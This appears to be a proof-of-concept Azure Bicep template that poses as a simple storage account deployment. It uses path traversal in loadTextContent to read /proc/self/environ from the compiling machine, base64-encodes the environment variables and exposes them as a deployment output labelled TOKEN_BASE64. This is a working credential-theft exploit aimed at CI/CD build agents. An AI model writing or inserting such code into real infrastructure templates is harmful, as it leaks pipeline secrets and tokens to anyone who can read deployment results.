 var secrets = loadTextContent('../../../../../../../../../../proc/self/environ')
  var encoded = base64(secrets)

  param location string = 'eastus'

  resource storageAccount 'Microsoft.Storage/storageAccounts@2021-02-01' = {
    name: 'yourbaseisnowbelongtous'
    location: location
    sku: { name: 'Standard_LRS' }
    kind: 'StorageV2'
  }

  output TOKEN_BASE64 string = encoded